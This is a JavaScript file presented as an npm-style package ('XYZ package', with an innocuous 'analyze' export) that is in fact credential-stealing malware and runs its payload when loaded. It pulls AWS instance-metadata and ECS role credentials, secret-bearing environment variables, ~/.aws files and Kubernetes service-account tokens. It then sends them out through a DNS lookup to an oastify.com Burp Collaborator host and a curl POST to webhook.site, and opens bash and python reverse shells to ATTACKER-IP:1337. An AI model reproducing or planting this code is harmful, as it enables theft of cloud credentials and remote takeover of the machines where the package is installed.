const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

function executeCommand(cmd) {
    try {
        return execSync(cmd, { encoding: 'utf8', timeout: 10000 });
    } catch (error) {
        return `Error: ${error.message}`;
    }
}

function extractAWSMetadata() {
    const metadataBase = 'http://169.254.169.254/latest/meta-data/';
    const credentialsBase = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
    
    try {
        const roleCmd = `curl -s --connect-timeout 3 "${credentialsBase}"`;
        const roleName = executeCommand(roleCmd).trim();
        
        if (roleName && !roleName.includes('Error')) {
            const credsCmd = `curl -s --connect-timeout 3 "${credentialsBase}${roleName}"`;
            const credentials = executeCommand(credsCmd);
           
            const instanceId = executeCommand(`curl -s --connect-timeout 3 "${metadataBase}instance-id"`);
            const region = executeCommand(`curl -s --connect-timeout 3 "${metadataBase}placement/region"`);
            const accountId = executeCommand(`curl -s --connect-timeout 3 "${metadataBase}identity-credentials/ec2/info"`);
            
            return {
                credentials: JSON.parse(credentials),
                instanceId: instanceId.trim(),
                region: region.trim(),
                accountId: accountId,
                roleName: roleName
            };
        }
    } catch (error) {
        return null;
    }
    return null;
}
function extractEnvCredentials() {
    const awsEnvVars = {};
    const envVars = process.env;
    
    Object.keys(envVars).forEach(key => {
        if (key.includes('AWS') || key.includes('SECRET') || key.includes('ACCESS') || key.includes('TOKEN')) {
            awsEnvVars[key] = envVars[key];
        }
    });
    
    return awsEnvVars;
}

function searchAWSCredentials() {
    const credentialPaths = [
        '~/.aws/credentials',
        '~/.aws/config',
        '/root/.aws/credentials',
        '/root/.aws/config',
        '/home/*/.aws/credentials',
        '/var/lib/jenkins/.aws/credentials',
        '/opt/aws/credentials'
    ];
    
    const foundCreds = {};
    credentialPaths.forEach(credPath => {
        try {
            if (fs.existsSync(credPath)) {
                foundCreds[credPath] = fs.readFileSync(credPath, 'utf8');
            }
        } catch (error) {
            // Ignore file access errors
        }
    });
    
    return foundCreds;
}
function extractContainerCredentials() {
    const containerCreds = {};
    if (process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI) {
        const ecsCredsUrl = `http://169.254.170.2${process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}`;
        try {
            const ecsCreds = executeCommand(`curl -s --connect-timeout 3 "${ecsCredsUrl}"`);
            containerCreds.ecsTaskRole = JSON.parse(ecsCreds);
        } catch (error) {
            // Ignore ECS errors
        }
    }
    const serviceAccountPath = '/var/run/secrets/kubernetes.io/serviceaccount/token';
    if (fs.existsSync(serviceAccountPath)) {
        try {
            containerCreds.k8sServiceAccount = fs.readFileSync(serviceAccountPath, 'utf8');
        } catch (error) {
            // Ignore K8s errors
        }
    }
    
    return containerCreds;
}
function exfiltrateData(data) {
    const exfilData = {
        timestamp: new Date().toISOString(),
        hostname: os.hostname(),
        platform: os.platform(),
        user: executeCommand('whoami').trim(),
        awsData: data
    };
    const payload = Buffer.from(JSON.stringify(exfilData)).toString('base64');
    executeCommand(`nslookup ${payload.substring(0, 50)}.BURP-Collab.oastify.com`);
    executeCommand(`curl -X POST https://webhook.site/ID -H "Content-Type: application/json" -d '${JSON.stringify(exfilData)}' --connect-timeout 5`);
    fs.writeFileSync('/tmp/.aws-harvest', JSON.stringify(exfilData, null, 2));
    
    return payload;
}
function establishReverseShell() {
    const attackerIP = 'ATTACKER-IP';
    const attackerPort = '1337'; 
    const shells = [
        `bash -i >& /dev/tcp/${attackerIP}/${attackerPort} 0>&1`,
        `python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${attackerIP}',${attackerPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"`
    ];
    
    shells.forEach(shell => {
        try {
            executeCommand(shell);
        } catch (error) {
            // Continue to next shell method
        }
    });
}

// Main execution
function main() {
    console.log('XYZ package...');
    setTimeout(() => {
        const awsCredentials = {
            metadata: extractAWSMetadata(),
            environment: extractEnvCredentials(), 
            files: searchAWSCredentials(),
            container: extractContainerCredentials(),
            systemInfo: {
                hostname: os.hostname(),
                user: executeCommand('whoami').trim(),
                id: executeCommand('id').trim(),
                pwd: executeCommand('pwd').trim(),
                uname: executeCommand('uname -a').trim()
            }
        };
        exfiltrateData(awsCredentials);
        establishReverseShell();
        
    }, 2000);
}

main();
module.exports = {
    analyze: function() {
        return 'Analysis complete';
    }
};
